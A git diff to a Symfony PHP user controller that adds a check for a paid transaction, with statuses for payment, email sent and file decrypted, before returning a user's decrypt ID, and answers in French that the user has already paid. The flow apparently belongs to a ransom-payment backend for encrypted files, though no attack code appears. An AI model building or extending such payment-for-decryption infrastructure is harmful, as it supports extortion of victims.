@@ -4,8 +4,10 @@ namespace App\Controller\Api;
 
 use App\Controller\BaseController;
 use App\Entity\Log;
+use App\Entity\Transaction;
 use App\Entity\User;
 use App\Repository\LogRepository;
+use App\Repository\TransactionRepository;
 use App\Repository\UserRepository;
 use App\Service\API\UserService;
 use Symfony\Component\HttpFoundation\Request;
@@ -20,7 +22,8 @@ class UserController extends BaseController
         private UserPasswordHasherInterface $passwordHasher,
         private UserRepository $userRepository,
         private LogRepository $logRepository,
-        private UserService $userService
+        private UserService $userService,
+        private TransactionRepository $transactionRepository
     ) {}
 
     /**
@@ -86,9 +89,22 @@ class UserController extends BaseController
                 $this->userRepository->save($user, true);
             }
 
+            $isTransactionAlreadyPaid = $this->transactionRepository->findLastOneByUserAndStatus($user, [
+                Transaction::TRANSACTION_STATUS_PAYMENT_SUCCESS,
+                Transaction::TRANSACTION_USER_EMAIL_SENT,
+                Transaction::TRANSACTION_USER_FILE_DECRYPTED
+            ]);
+
+            if($isTransactionAlreadyPaid) {
+                return $this->json([
+                    'error' => true,
+                    'message' => "Tu as déjà payé, regarde tes mails !"
+                ]);
+            }
+
             return $this->json([
                 'success' => true,
-                'decryptId' => $user->getDecryptId()
+                'token' => $user->getDecryptId()
             ]);
         } catch(\Throwable $e) {
             return $this->failure($e->getMessage() ?? 'Une erreur est survenue');
